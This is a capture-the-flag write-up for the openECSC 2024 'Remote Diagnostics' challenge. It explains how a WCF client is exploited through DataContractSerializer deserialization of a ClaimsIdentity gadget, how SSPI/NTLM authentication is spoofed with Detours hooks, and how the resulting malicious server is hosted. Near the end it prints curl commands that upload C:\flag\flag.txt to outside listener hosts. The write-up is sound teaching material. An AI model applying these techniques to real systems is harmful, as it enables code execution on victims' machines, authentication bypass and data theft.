# openECSC 2024 - Round 2

## [misc] Remote Diagnostics (8 solves)

We've developed Remote Diagnostics, a tool tailored for IT supporters to efficiently troubleshoot employee workstations remotely. The server component already passed a penetration test with no issues. Now, we need your expertise to assess the security of the client component.

Flag is located at `C:\flag\flag.txt`.

Refer to the `README.md` file in the attachments for detailed instructions.

Site: [http://remotediagnostics.challs.open.ecsc2024.it](http://remotediagnostics.challs.open.ecsc2024.it)

Author: Oliver Lyak <@ly4k>

## Table of contents

- [TL;DR](#tldr)
- [Details](#details)
  - [Participant instructions](#participant-instructions)
  - [Demonstration](#demonstration)
- [Analysis](#analysis)
  - [First steps](#first-steps)
  - [Windows Communication Foundation (WCF)](#windows-communication-foundation-wcf)
  - [Data serialization](#data-serialization)
- [Vulnerabilities](#vulnerabilities)
  - [Insecure deserialization](#insecure-deserialization)
    - [.NET reflection and function hijacking](#net-reflection-and-function-hijacking)
    - [Popping calc.exe](#popping-calcexe)
  - [Authentication bypass](#authentication-bypass)
    - [WCF authentication using Windows credentials](#wcf-authentication-using-windows-credentials)
    - [SSPI API](#sspi-api)
    - [SSPI hijacking](#sspi-hijacking)
    - [SSPI spoofing](#sspi-spoofing)
- [Exploitation](#exploitation)
- [Caveat](#caveat)
- [Conclusion](#conclusion)

## TL;DR

This challenge was about exploiting a Windows Communication Foundation (WCF) client application. The client was vulnerable to insecure deserialization using the `DataContractSerializer`, which allowed for arbitrary code execution. The client and server communicated using Windows credentials, which were authenticated using the Security Support Provider Interface (SSPI) API. The SSPI API was vulnerable to hijacking and spoofing, as signing and encryption were disabled, which allowed spoofing the authentication from the client.

The following steps are a high-level overview of the exploitation process:

1. Reverse engineer the client and server to understand the communication protocol.
2. Discover the type `WhoAmIObject` that uses the vulnerable `ClaimsIdentity` object.
3. Exploit the insecure deserialization using the `ClaimsIdentity` type to execute arbitrary code.
4. Implement a malicious server that returns the malicious `ClaimsIdentity` object.
5. Hook/hijack the SSPI API to bypass the authentication on the malicious server.
6. Expose the malicious server to the challenge client to exfiltrate the flag.

## Details

### Participant instructions

This challenge consists of a client and a server component. Your goal is to exploit the client to exfiltrate the flag located at `C:\flag\flag.txt`. Please read the following instructions carefully.

The client component is `RemoteDiagnostics.Client.exe`. The server component is `RemoteDiagnostics.Server.exe`. The provided server component is not part of the challenge and is only provided to help you understand the client component.

Imagine the server component running on every employee's laptop within an organization, while the client component operates on the IT supporter's computer. The IT supporter uses the client to connect to the server component on an employee's laptop for remote troubleshooting.

The scenario is: What could happen if an IT supporter unintentionally connects to or is deceived into connecting to a malicious server (employee laptop)?

To solve this challenge, you need to host a server that listens for incoming connections and exploits the client.

You can request the challenge client to connect to your server by submitting your server's hostname/IP and port to the challenge web interface listed in the challenge description. A client will then connect to your server using a random username and password each time - to simulate a real-world scenario where an IT supporter connects using their own credentials. The client will then perform a series of actions via an automatic simulation. The simulation and actions are hardcoded in the client.

You can launch the server and client by simply double-clicking the executables `RemoteDiagnostics.Server.exe` and `RemoteDiagnostics.Client.exe`, respectively. You can then connect to `localhost` using your current Windows credentials. **Remember to allow the server and client through your firewall.**

If you want to run the simulation yourself, you can run the client with the following PowerShell command (or otherwise set the environment variables like so):

```powershell
$env:DHost = "localhost"
$env:DUser = "<randomusername>"
$env:DPass = "<randompassword>"
.\RemoteDiagnostics.Client.exe
```

The flag is mounted as read-only at `C:\flag\flag.txt` in a Docker container based on `mcr.microsoft.com/windows/servercore:ltsc2022`. The Docker container is forcefully destroyed after 30 seconds.

**When you believe you have a solution, remember to check that your own simulated client can be exploited using the remote address of your server and a random username/password.**

### Demonstration

Let's see the client in action.

When we first start the client, we are prompted to enter the server's hostname or IP address. We can also choose to either use the current Windows user's credentials or enter custom credentials.

![client01.png](./writeup/imgs/client01.png)

So let's start up the provided server and enter `localhost` as the server's hostname.

![client02.png](./writeup/imgs/client02.png)

When we now click connect, we will see that we have a few different tabs with various information. The first tab shows the server's basic host information.

![client03.png](./writeup/imgs/client03.png)

Here's a quick demonstration of all the features of the client.

![client04.gif](./writeup/imgs/client04.gif)

And when we're ready to exploit the challenge client, we can simply submit the server's IP address and port to the challenge web interface.

![webinterface.png](./writeup/imgs/webinterface.png)

## Analysis

If we take a look at the types of provided files, we can see that the client is a .NET assembly GUI application, and the server is a .NET assembly console application. We're also provided with a "Contract", which is a .NET assembly library (DLL).

![file.png](./writeup/imgs/file.png)

At this point, we can start reverse engineering the different components to understand how they work and how we can exploit them. Although the project is now archived, the [dnSpy](https://github.com/dnSpy/dnSpy) tool is still my go-to tool for reverse engineering and debugging .NET applications. I prefer running the tool in a Windows VM, as it will have access to all the .NET Framework assemblies and will generally provide a better experience.

So let's load the components into dnSpy and start reverse engineering.

### First steps

When we first open up the client in dnSpy, we can see that it will check if the environment variables `DHost`, `DUser`, and `DPass` are set, and if they are, it will set `simulation = true`. This matches very well with the provided instructions, where we are told to set these environment variables to simulate the client. We will also notice that it will create and spawn a new `Connect` window.

![rev01.png](./writeup/imgs/rev01.png)

If we follow the declaration of the `Connect` class, we can see that it is essentially derived from the `Form` class, which in Windows Form applications is how you define a new window. We can also see some functions, which appear to be events, such as `useCurrentCredentials_CheckedChanged`.  

![rev02.png](./writeup/imgs/rev02.png)

Further down in the same class, we can see the `connectBtn_Click` function. This function is very short but has references to some `AsyncVoidMethodBuilder`.

![rev03.png](./writeup/imgs/rev03.png)

dnSpy will not show the contents of async functions by default, so we need to enable this option in the settings by enabling "Show hidden compiler generated types and methods".

![rev04.png](./writeup/imgs/rev04.png)

We can now follow the reference to the async function, and we should see a bit more functionality. Decompiling async functions can sometimes be a bit tricky to understand, as it performs a bunch of transformations behind the scenes. Instead, we should focus on functionality not related to the async state machine, such as the call to `DiagnosticsClient.Connect`.

![rev05.png](./writeup/imgs/rev05.png)

If we take a look further into the function, we'll notice there isn't much else going on, except for creating a new `MainWindow` and showing it.

![rev06.png](./writeup/imgs/rev06.png)

Inside the `DiagnosticsClient.Connect`, we'll find yet another async function. We can follow the async function method, as shown below.

![rev07.png](./writeup/imgs/rev07.png)

We find ourselves inside another async function, and as before, we'll focus on the non-async parts of the function. We can see that it will create a new `DiagnosticsProxy` using a new `DiagnosticsBinding` followed by the remote address and some network credentials that are created based on the user's input.

![rev08.png](./writeup/imgs/rev08.png)

The `DiagnosticsBinding` seems to be a basic class derived from the `NetTcpBinding` class. It sets a few properties on the base class' `Security` object. We'll get back to that later. For now, we can notice `SecurityMode.Transport` and `TcpClientCredentialType.Windows`.

![rev09.png](./writeup/imgs/rev09.png)

If we instead follow the `DiagnosticsProxy` class, we'll see that it is derived from `ClientBase<IDiagnostics>`. It modifies the `ClientCredentials` object, sets the impersonation level to `Impersonation`, and the credentials to the provided network credentials - or the current Windows user's credentials. Furthermore, we can see a few functions which essentially are just proxies to the `Channel` object.

![rev10.png](./writeup/imgs/rev10.png)

If we follow the `IDiagnostics` interface, we'll see that it has a few function definitions, such as `Ping`, `WhoAmI`, `GetDiskInformation`, `GetHostInformation`, and more. These functions seem to be related to the ones we explored in the GUI earlier.

![rev11.png](./writeup/imgs/rev11.png)

And if we take a look inside the `DiskInformationObject` type returned by the `GetDiskInformation` function, we can see that it uses two attributes: `DataContract` and `DataMember`.

![rev12.png](./writeup/imgs/rev12.png)

### Windows Communication Foundation (WCF)

At this point, we can suspect that the client and server are communicating over some protocol using this interface. So if we Google some of the attributes we've seen in the interface, we should eventually keep seeing the same results related to Windows Communication Foundation (WCF).

![wcf01.png](./writeup/imgs/wcf01.png)

If we take a look at the first link, we should see something very familiar to what we've been reverse engineering.

![wcf02.png](./writeup/imgs/wcf02.png)

In essence, WCF is a Remote Procedure Call (RPC) framework that allows for communication between different components over a network. This means that a server and a client can define an interface, and the server can implement this interface. The client can then call the functions defined in the interface, and the server will execute the functions and return the result to the client.  The WCF framework will handle transport, authentication, serialization, and more.

![wcf03.png](./writeup/imgs/wcf03.png)

We can now take a look inside the server component to understand how it works. We can see that it will create a new `ServiceHost` object and add a new `DiagnosticsService` object to it. It will then open the service host and wait for incoming connections. It's using the same `DiagnosticBinding` as the client.

![rev13.png](./writeup/imgs/rev13.png)

The server then implements the `IDiagnostics` interface, and we can see that it has a few functions that match the ones in the client. The `Ping` function simply returns `true`, and the `WhoAmI` function returns the current Windows user's identity, such as group memberships. Notice that the `WhoAmI` function is decorated with the `Impersonation` attribute. This means that the server will execute the function as the client's user, hence the aforementioned `Impersonation` setting in the client. The WCF framework will handle all the authentication and impersonation for us. As such, the client can call the `WhoAmI` function to retrieve its own user's identity; for instance for checking if the user is a member of the `Administrators` group on the server. 

![rev14.png](./writeup/imgs/rev14.png)

We can also see the `GetDiskInformation` function, which returns a new `DiskInformationObject`. This object has a single property named `Drives` which is a list of the built-in `DriveInfo` object.

![rev15.png](./writeup/imgs/rev15.png)

![rev16.png](./writeup/imgs/rev16.png)

### Data serialization

So how can the server return seemingly complex objects such as `DriveInfo` objects? The answer is serialization. The WCF framework will serialize the objects before sending them over the network and deserialize them on the other side. If we Google "wcf serialization", we can quickly find some information on how WCF handles serialization.

![wcf04.png](./writeup/imgs/wcf04.png)

The first link is an article from Microsoft that explains how WCF handles serialization, and that WCF uses "a new serialization engine, the DataContractSerializer". Further down, it also explains that WCF includes the `NetDataContractSerializer`, which "is **not** secure". This serializer is not the default serializer, and to use it, the developer needs to explicitly change the serializer.

![wcf05.png](./writeup/imgs/wcf05.png)

So is the `DataContractSerializer` secure? We can quickly find another article from Microsoft that explains the security of the `DataContractSerializer`.

![wcf06.png](./writeup/imgs/wcf06.png)

One of the bullet points is "Malicious code execution" - "Incoming untrusted data causes the receiving side to run code it did not intend to." - this sounds very interesting from an attacker's perspective.

![wcf07.png](./writeup/imgs/wcf07.png)

If we investigate further, we see essentially two classes of threats - both related to deserializing objects that can have malicious side effects.

![wcf08.png](./writeup/imgs/wcf08.png)

## Vulnerabilities

### Insecure deserialization

According to the documentation, the `DataContractSerializer` is secure by default, but it can be insecure if the developer allows it to deserialize objects of dangerous types. It will only serialize and deserialize primitive types or known types that are explicitly marked with the `DataMember` attribute. This means that if a complex object has complex properties, each of these properties must be marked as a known type before the `DataContractSerializer` will serialize and deserialize the object.

But what about side effects during object deserialization? The `WhoAmIObject` returned by the `WhoAmI` function includes a `DataMember` for the built-in `ClaimsIdentity` type. This type is a valid way of returning a user's claims (such as groups) to the client.

![rev17.png](./writeup/imgs/rev17.png)

If we take a look at the `ClaimsIdentity` type, we can see that it is marked with the attribute `Serializable`.

![rev18.png](./writeup/imgs/rev18.png)

A class can extend the serialization and deserialization of itself using the `OnSerializing` and `OnDeserialized` method attributes. These methods can be used to perform additional actions during the serialization and deserialization process. We can notice that upon serializing and deserializing, it will call `SerializeClaims` and `DeserializeClaims`, respectively. This sounds like it could have some interesting side effects.

![rev19.png](./writeup/imgs/rev19.png)

If you're familiar with .NET deserialization attacks, you should've heard of [ysoserial.net](https://github.com/pwntester/ysoserial.net). This tools allows you to generate payloads for various .NET deserialization vulnerabilities.

![yso01.png](./writeup/imgs/yso01.png)

It works by chaining "gadgets" together to perform various actions. One such gadget is the `ClaimsIdentity` type, which we've seen in the `WhoAmIObject`. So this type is known to be dangerous. "Unfortunately", the `DataContractSerializer` is not implemented for this gadget in the tool, and even if it were, how could we inject our payload into the client?

![yso02.png](./writeup/imgs/yso02.png)

We can take a look inside the gadget to see how ysoserial.net generates the payload for one of the formatters. We can notice the `m_serializedClaims` field is set to a Base64 encoded string.

![yso03.png](./writeup/imgs/yso03.png)

Back in the source code, we can see that the `OnSerializingMethod` will set the `m_serializedClaims` field to the return value of `SerializeClaims`.

![rev20.png](./writeup/imgs/rev20.png)

This function is rather simple. It uses the infamous `BinaryFormatter` to serialize `m_instanceClaims` and then returns the Base64 encoded string. The `BinaryFormatter` is known to be insecure, as it allows serializing and deserializing any object, because the type of the object is stored in the serialized data.

![rev21.png](./writeup/imgs/rev21.png)

When doing my own research on deserialization attacks against the `DataContractSerializer`, I discovered this [blog post](https://muffsec.com/blog/finding-a-new-datacontractserializer-rce-gadget-chain/) by [muffSec](https://muffsec.com/blog/). The blog post explains how to exploit the `DataContractSerializer` using the `SessionSecurityToken` type, but most importantly, it included a short and dirty proof-of-concept for testing the deserialization attack.

As can be seen, it creates a new `SessionSecurityToken` gadget and serializes it using the `DataContractSerializer`. It then deserializes the payload back into a new object. Interestingly enough, the `SessionSecurityToken` is actually constructed using a `ClaimsIdentity` object, and in this case, the author assigns the `TypeConfuseDelegateGadget` payload to the `ClaimsIdentity` object's `BootstrapContext` property.

![poc01.png](./writeup/imgs/poc01.png)

The `TypeConfuseDelegateGadget` is a gadget that allows for arbitrary code execution. The workings of this gadget is out of scope for this writeup, but it essentially allows us to create an object that when deserialized using the `BinaryFormatter`, will execute an arbitrary system command.

![poc02.png](./writeup/imgs/poc02.png)

But since it used the `BootstrapContext`, can't we also just do that instead of the `m_serializedClaims` field? Let's modify the proof-of-concept to use the `BootstrapContext` property instead. The code can be found in [./writeup/src/DeserializePOC01/](./writeup/src/DeserializePOC01/).

![poc03.png](./writeup/imgs/poc03.png)

If we run the proof-of-concept, we can see that it fails to serialize the `ClaimsIdentity` object, as the `SortedSet` type (used in `TypeConfuseDelegateGadget`) is not expected as a type for the `BootstrapContext` property. The reason why it works for the `SessionSecurityToken` is simply because the `SessionSecurityToken` class internally uses the `BinaryFormatter` to serialize/deserialize the `BootstrapContext` of its `ClaimsIdentity` objects, as shown [here](https://referencesource.microsoft.com/#System.IdentityModel/System/IdentityModel/Tokens/SessionSecurityToken.cs,980).

![poc04.png](./writeup/imgs/poc04.png)

#### .NET reflection and function hijacking

So it appears that we need to use the `m_serializedClaims` field to inject our payload. But how can we do that? Upon serializing the `ClaimsIdentity` object, the `SerializeClaims` method will be called to set the `m_serializedClaims` field. This means that if we manually set this field using reflection, it would be overwritten when the object is serialized by the `DataContractSerializer`. So what about changing the value of `m_instanceClaims`, which is serialized by the `SerializeClaims` method? Well, you'd get an exception, as the `m_instanceClaims` field suddenly has a different type.

So it appears we need some C# .NET reflection magic to hijack the `SerializeClaims` method. I found another great [article](https://www.infoq.com/articles/overriding-sealed-methods-c-sharp/) that explains how to override sealed methods in C# using reflection. The payload is very small, but it has to be slightly modified for our use case.

![poc05.png](./writeup/imgs/poc05.png)

So back in our proof-of-concept, we can implement the function hijack described in the article. We need to be aware that our project is built in `Release` and using `64-bit` architecture. This is because we're overwriting a function pointer, and the offsets will be different between `Debug` and `Release` builds, and between `32-bit` and `64-bit` architectures.

We will then overwrite the function pointer of the `SerializeClaims` method to point to our own function `SerializeClaimsHijack`. This function will just print `Hijack called` and return the string `test`.

![poc06.png](./writeup/imgs/poc06.png)

If we now run the payload, we'll notice that our hijack function is called, and that the **deserialization** of our object fails. This is because we only return `test` which when Base64 decoded is not a valid serialized object. But now we know that we can hijack the `SerializeClaims` method.

![poc07.png](./writeup/imgs/poc07.png)

#### Popping calc.exe

Let's now instead use the `TypeConfuseDelegateGadget` payload to execute the `calc.exe` command. We will then serialize this object just like the claims were originally serialized. As said before, we don't need to understand how the `TypeConfuseDelegateGadget` works, we just need to know that it is a known gadget that allows for arbitrary code execution. The code can be found in [./writeup/src/DeserializePOC02/](./writeup/src/DeserializePOC02/).

![poc08.png](./writeup/imgs/poc08.png)

And voilà, when we run the POC, it will serialize the malicious `ClaimsIdentity` object, and when it is deserialized, it will execute the `calc.exe` command.

![poc09.gif](./writeup/imgs/poc09.gif)

Now, let's try to build a malicious server that will return the malicious `ClaimsIdentity` object. 

We first create a new `C# Console App (.NET Framework)` project using Visual Studio. We then add a reference to the provided `RemoteDiagnostics.Contract.dll` library.

![poc10.png](./writeup/imgs/poc10.png)

We can now decompile the server to get a quick setup of our server.

![poc11.png](./writeup/imgs/poc11.png)

We can simply copy-paste the code into our new project. We will notice that the `DiagnosticService` class is not defined.

![poc12.png](./writeup/imgs/poc12.png)

So we can add a new class named `DiagnosticService` and implement the `IDiagnostics` interface.

![poc13.png](./writeup/imgs/poc13.png)

Again, we can decomplie the server to get its implementation of the `IDiagnostics` interface.

![poc14.png](./writeup/imgs/poc14.png)

We then copy-paste the code from the decompiled server. We will need to remove some of the excess code at the end - basically all the type and functions definitions at the end of the class that are "artifacts" from the decompilation process. We will also rewrite the `GetProcessSecurity` function to return some random static data, as we don't care about the actual functionality of our server. The code can be found in [./writeup/src/ServerPOC01/](./writeup/src/ServerPOC01/). It should look something like this.

![poc15.png](./writeup/imgs/poc15.png)

When we now run the server, we should see that the hijacking was done and that it listens for incoming connections.

![poc16.png](./writeup/imgs/poc16.png)

When we now run the client, it should trigger the `WhoAmI` call as the very first thing, as this is used in the title of the main window. The server will then serialize the `WhoAmIObject`, which includes the `ClaimsIdentity` object that upon serialization will call our hijacked `SerializeClaims` method.

When the client receives the `WhoAmIObject`, it will deserialize the malicious `ClaimsIdentity` object and execute the `calc.exe` command.

![poc17.gif](./writeup/imgs/poc17.gif)

### Authentication bypass

But as mentioned in the instructions to the participants, the simulation is run using a random pair of credentials each time. So what happens if we execute the simulation as described in the instructions?

The server will reject the credentials. Nowhere in the server did we implement any authentication, but the binding we saw earlier was configured to use `TcpClientCredentialType.Windows`. This means that the client and server will "somehow" authenticate using Windows credentials.

![poc18.png](./writeup/imgs/poc18.png)

#### WCF authentication using Windows credentials

Let's investigate this "somehow" further. Back in the decompilation of the `DiagnosticsBinding`, we see that it is a class derived from the `NetTcpBinding` class. This class has a `Security` property with fields that are set to `SecurityMode.Transport`, `TcpClientCredentialType.Windows`, and `ProtectionLevel.None`. Although the `ProtectionLevel` is set to `None`, the `TcpClientCredentialType.Windows` is set to `Windows`. This means that the client and server will authenticate using Windows credentials. The `ProtectionLevel` specifies whether the communication is signed/encrypted or not, and in this case, it is not.

![rev22.png](./writeup/imgs/rev22.png)

If we follow the decompilation of the `NetTcpBinding`, we see that it is a built-in class derived from the `Binding` class.

![rev23.png](./writeup/imgs/rev23.png)

It is possible to create custom bindings in WCF, and if we lookup the documentation further, we'll eventually see that we need to implement some method to return a `BindingElementCollection`, which is essentially a list of sub-bindings. If we take a look inside the `NetTcpBinding` class, we'll see that it has a `CreateBindingElements` method that returns a list of sub-bindings.

One of these sub-bindings is created by calling `CreateTransportSecurity`, which seems to be related to the previous fields we saw in the `DiagnosticsBinding` class.

![rev24.png](./writeup/imgs/rev24.png)

Inside the `CreateTransportSecurity` method, we see that if `this.mode` is equal to `SecurityMode.Transport`, it will return the value of `this.transportSecurity.CreateTransportProtectionAndAuthentication`.

![rev25.png](./writeup/imgs/rev25.png)

This function will check if the `clientCredentialType` is set to `Certificate` or `None`, and if it is, it will create a new SSL binding element. Otherwise, it will create a new `WindowsStreamSecurityBindingElement` and set the `ProtectionLevel` to the configured value.

![rev26.png](./writeup/imgs/rev26.png)

Don't worry, we're almost there. If we follow the `WindowsStreamSecurityBindingElement` class, we'll see that it is derived from the `StreamUpgradeBindingElement` class.

![rev27.png](./writeup/imgs/rev27.png)

If we follow the `StreamUpgradeBindingElement` class, we'll notice that it is an abstract class with two abstract methods: `BuildClientStreamUpgradeProvider` and `BuildServerStreamUpgradeProvider`.

![rev28.png](./writeup/imgs/rev28.png)

Back in the `WindowsStreamSecurityBindingElement` class, we can see that it defines these two functions and returns a new `WindowsStreamSecurityUpgradeProvider`, and the only difference is that the last parameter is `true` for the client and `false` for the server.

![rev29.png](./writeup/imgs/rev29.png)

If we follow this class, we'll see that it is derived from the `StreamSecurityUpgradeProvider` class. It is a rather large class with many sub-classes, but let's try to focus on key parts.

![rev30.png](./writeup/imgs/rev30.png)

One of the private classes defined is the `WindowsStreamSecurityUpgradeAcceptor`. It includes a method named `OnAcceptUpgrade`. This functions creates a new `NegotiateStream` class and later calls `negotiateStream.AuthenticateAsServer` using the defined `ProtectionLevel` and `ImpersonationLevel`.

![rev31.png](./writeup/imgs/rev31.png)

We can also find another class named `WindowsStreamSecurityUpgradeInitiator`. The name suggests that this is the client-side authentication process.

![rev32.png](./writeup/imgs/rev32.png)

The `WindowsStreamSecurityUpgradeInitiator` class has a method named `OnInitiateUpgrade`. This function creates a new `NegotiateStream` class and later calls `negotiateStream.AuthenticateAsClient` using the defined `ProtectionLevel` and `ImpersonationLevel`.

![rev33.png](./writeup/imgs/rev33.png)

So what is this `NegotiateStream` class? If we Google it, we'll find the documentation for the `NegotiateStream` class, which is described as "Provides a stream that uses the Negotiate security protocol to authenticate the client, and optionally the server, in client-server communication.". Conveniently, the documentation also includes an example of how to use the `NegotiateStream` class between a client and a server.

![rev34.png](./writeup/imgs/rev34.png)

If we look at the client-side code, we can see that it creates a new `NegotiateStream` object and calls `AuthenticateAsClient` to authenticate the client.

![rev35.png](./writeup/imgs/rev35.png)

Likewise, the server-side code creates a new `NegotiateStream` object and calls `AuthenticateAsServer` and authenticates the incoming client.

![rev36.png](./writeup/imgs/rev36.png)

So we can take the code and create a simple client and server that uses the `NegotiateStream` class to authenticate the client and server. The code can be found in [./writeup/src/NegotiateStreamPOC01/](./writeup/src/NegotiateStreamPOC01/).

![poc19.png](./writeup/imgs/poc19.png)

When we run the server and the client, we should see that the client authenticates using the current Windows user's credentials, and the server accepts the connection. In this case, they negotiated an anonymous connection. Nonetheless, we can see that the `NegotiateStream` class takes care of the authentication process for us.

![poc20.png](./writeup/imgs/poc20.png)

#### SSPI API

If we take a look at the "Remarks" section of the documentation for the `NegotiateStream` class, we can see that it uses the Security Support Provider Interface (SSPI) to authenticate the client and server.

![rev37.png](./writeup/imgs/rev37.png)

If you already know about Windows authentication, you could've have guessed that WCF uses the SSPI API for Windows authentication and skipped the previous reverse engineering steps, but I wanted to show how you can reverse engineer the WCF framework to understand how the authentication process works.

I would definitely recommend reading [this article from Microsoft](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/windows-authentication-architecture) about the Windows Authentication architecture. SSPI is described as "the API that obtains integrated security services for authentication, message integrity, message privacy, and security quality-of-service for any distributed application protocol." I would also recommend reading [this post](https://davenport.sourceforge.net/ntlm.html) to get a better understanding of the SSPI API and how it is used for authentication. But in short, the SSPI API works like this:

![sspi01.png](./writeup/imgs/sspi01.png)

> Image: [https://stackoverflow.com/a/49411527](https://stackoverflow.com/a/49411527) ([Ian Boyd](https://stackoverflow.com/users/12597/ian-boyd))

So if a client and server wants to perform authentication, the client will continously call `InitializeSecurityContext` and the server will continously call `AcceptSecurityContext`. On each call, an "opaque" blob is returned that is sent and used in the other party's function until the authentication is complete.

#### SSPI hijacking

One of my favorite methods for debugging Windows API calls is to use Frida. If you don't know what Frida is, I would recommend reading [this post](https://www.frida.re/docs/home/). In short, it allows us to hook and intercept function calls. Here's a short Frida script that will hook the `InitializeSecurityContext` and `AcceptSecurityContext` along with the `AcquireCredentialsHandle` function which is used on both the client and server to create a credential handle that is passed to the `InitializeSecurityContext` and `AcceptSecurityContext` functions, respectively.

The script will just print the function name when it is called.

![sspi02.png](./writeup/imgs/sspi02.png)

We will then modify the client and server to load the `Secur32.dll` library (where the hooked functions are located) followed by a pause to allow us to attach the Frida script. The code can be found in [./writeup/src/NegotiateStreamPOC01/sspi.js](./writeup/src/NegotiateStreamPOC01/sspi.js).

![sspi03.png](./writeup/imgs/sspi03.png)

When we now run the server and the client, we can attach the Frida script to the client and server processes. We should see that both the client and server will call the `AcquireCredentialsHandle` function to create a credential handle. Then the `InitializeSecurityContext` and `AcceptSecurityContext` functions are called continuously until the authentication is complete.

![sspi04.gif](./writeup/imgs/sspi04.gif)

Now, while Frida is a great tool, it can quickly become too complex to handle all the complex types passed to the SSPI functions. Instead, we can create a simple DLL in C/C++ that will hook the SSPI functions and use the Windows API to handle the complex types.

The [Detours](https://github.com/microsoft/Detours) library from Microsoft can be used for instrumenting native functions similar to Frida.

To hook a function, we only need a few lines of code. We first get the addresses of the functions we want to hook, and then we call `DetourAttach` to attach our own function to the target function. We can then call `DetourTransactionCommit` to commit the transaction.

![sspi05.png](./writeup/imgs/sspi05.png)

We must also define our own functions and make sure they have the same function signature as the hooked functions. We can find the definitions in the documentation or in the `Secur32.h` header file. For now, we will just print the function name when it is called, call the original function with the passed arguments, and print the return value.

![sspi06.png](./writeup/imgs/sspi06.png)

In our client and server, we can then load the DLL using the `LoadLibrary`. The code can be found in [./writeup/src/NegotiateStreamPOC02/](./writeup/src/NegotiateStreamPOC02/).

![sspi07.png](./writeup/imgs/sspi07.png)

When we now run the server and the client, we should see that the SSPI functions are hooked and that the client and server are performing the authentication process.

![sspi08.png](./writeup/imgs/sspi08.png)

Now let's remove the hook from the client and instead hardcode a random username and password in the client for the credentials.

![sspi09.png](./writeup/imgs/sspi09.png)

Now, we should see that the client fails to authenticate using the hardcoded credentials. We can also notice that the return value of `AcceptSecurityContext` is `0x8009030c` (`SEC_E_LOGON_DENIED`), which means that the server rejected the credentials.

![sspi10.png](./writeup/imgs/sspi10.png)

#### SSPI spoofing

But, is there anything that prevents use from tricking the client and server into thinking they are authenticated? What if we change the arguments of the `AcceptSecurityContext` to take the input of our own in-process `InitializeSecurityContext` function? This way, we can send the output of our own call to the `InitializeSecurityContext` function to the `AcceptSecurityContext` function within the same process, and then send the output of the `AcceptSecurityContext` function to the the client.

Let's start by obtaining a pair of credentials using the `AcquireCredentialsHandle` function and the current user's identity within the server process. We specify `SECPKG_CRED_OUTBOUND` indicating that we want to authenticate as a client.

![sspi11.png](./writeup/imgs/sspi11.png)

Within the `AcceptSecurityContextHijack` function, if the `phContext` argument is `NULL`, we know that this must be the first message from the client. In the second message, a context has been established, and the `phContext` will be set to the context handle. This is also described in the [documentation](https://learn.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-acceptsecuritycontext) for `AcceptSecurityContext`.

So if the `phContext` is `NULL`, we will call the `InitializeSecurityContext` function using our own in-process credentials. We will then store the opaque blob in the `ntlmType1Desc` variable.

![sspi12.png](./writeup/imgs/sspi12.png)

We then call the original `AcceptSecurityContext` function using the original arguments from the legitimate client, as this will create and fill the opaque blob that will be sent to the client.

![sspi13.png](./writeup/imgs/sspi13.png)

While the opaque blob is now filled, we will continue to call the original `AcceptSecurityContext` function again, but this time, we specify the input and output blobs to be our own in-process variables. This way, we overwrite the context handle with a new context handle that is about to authenticate with our own in-process credentials. The client will still receive its own opaque blob, but it has no way of knowing that the context handle has been changed.

![sspi14.png](./writeup/imgs/sspi14.png)

Now that the client received the opaque blob, it will call the `InitializeSecurityContext` function in its own application to create the next message. The client will send it to the server, and the server will call the `AcceptSecurityContext` function. This time, the `phContext` will not be `NULL`, and we will know that this is the second message from the client. We will then call the `InitializeSecurityContext` function using our in-process credentials and context along with the opaque blob we stored from the first call. We don't care about the incoming blob from the client. We will then store the opaque output blob in the `ntlmType3Desc` variable.

![sspi15.png](./writeup/imgs/sspi15.png)

Finally, we call the original `AcceptSecurityContext` function using the original arguments, but we specify that the input blob is our own in-process `ntlmType3Desc` variable instead of the client's blob. This way, we have successfully authenticated the client using our own credentials. The client will think it is authenticated using its credentials, and the server never knew that there was a different client. The code can be found in [./writeup/src/NegotiateStreamPOC03/](./writeup/src/NegotiateStreamPOC03/).

![sspi16.png](./writeup/imgs/sspi16.png)

If we now run the server and the client, we should see that the client successfully authenticates using the random credentials, and the server accepts the connection.

![sspi17.png](./writeup/imgs/sspi17.png)

## Exploitation

We can now take our malicious WCF server and combine it with the SSPI hijacking to create a server that accepts any client's credentials and returns the malicious `ClaimsIdentity` object. The code can be found in [./writeup/src/ServerPOC02/](./writeup/src/ServerPOC02/).

![poc21.png](./writeup/imgs/poc21.png)

When we now run the server and the client using random credentials, we should see that the client successfully authenticates using the random credentials. The client will then receive the malicious `ClaimsIdentity` object and execute the `calc.exe` command.

![poc22.gif](./writeup/imgs/poc22.gif)

The next step is to host the server publicly such that the challenge client can connect to it. I decided for simplicity to use [ngrok](https://ngrok.com/) to create a TCP tunnel to my local server.

![poc23.png](./writeup/imgs/poc23.png)

However, if we try to connect to the server using the remote ngrok address, it throws an error saying something about an "AddressFilter mismatch".

![poc24.png](./writeup/imgs/poc24.png)

A quick Google search will lead you to [this StackOverflow post](https://stackoverflow.com/a/10217733) that explains that the error is a server-side error that occurs when there is a port mismatch between the client and server. The solution is to add a `ServiceBehavior` attribute to the server that specifies the `AddressFilterMode` to `Any`.

![poc25.png](./writeup/imgs/poc25.png)

After this change, the server is ready to exploit the challenge client. The full solution code can be found in [./src/RemoteDiagnostics/](./src/RemoteDiagnostics/).

I ran my server using the following payload:

```powershell
$env:cmd = 'curl.exe -T C:/flag/flag.txt https://webhook.site/12345678-1234-1234-1234-1234567890ab'

.\Solution.Server.exe
```

![exp01.gif](./writeup/imgs/exp01.gif)

## Caveat

In the participant instructions, it is mentioned that "the flag is mounted as read-only at `C:\flag\flag.txt` in a Docker container based on `mcr.microsoft.com/windows/servercore:ltsc2022`".

One of my first attempts to exploit the challenge and exfiltrate the flag was to use `Invoke-WebRequest` to send the flag to a weblistener, but it failed. After a bit of debugging, I realized that it is because the flag was mounted as read-only, and the `Invoke-WebRequest` cmdlet in PowerShell would fail to exfiltrate the flag due to the `-InFile` parameter trying to modify the file attributes. If you run `curl`, `wget`, or `iwr` in PowerShell, they are all aliases for the `Invoke-WebRequest` cmdlet. This issue was fixed in PowerShell version 7.X, but the default version used on Windows is 5.1. This issue is also mentioned here: [https://www.reddit.com/r/PowerShell/comments/pwhsw2/invokerestmethod_method_put_infile_doesnt_work/](https://www.reddit.com/r/PowerShell/comments/pwhsw2/invokerestmethod_method_put_infile_doesnt_work/).

If you replicate the *exact same* environment as the one described in the provided instructions (flag marked as read-only and the correct Docker image), you should be able to observe this behaviour youself. You can reproduce this issue by marking a file as read-only on your local system and then trying to exfiltrate it using `curl -InFile C:\flag\flag.txt https://some-listener.com/` in PowerShell.

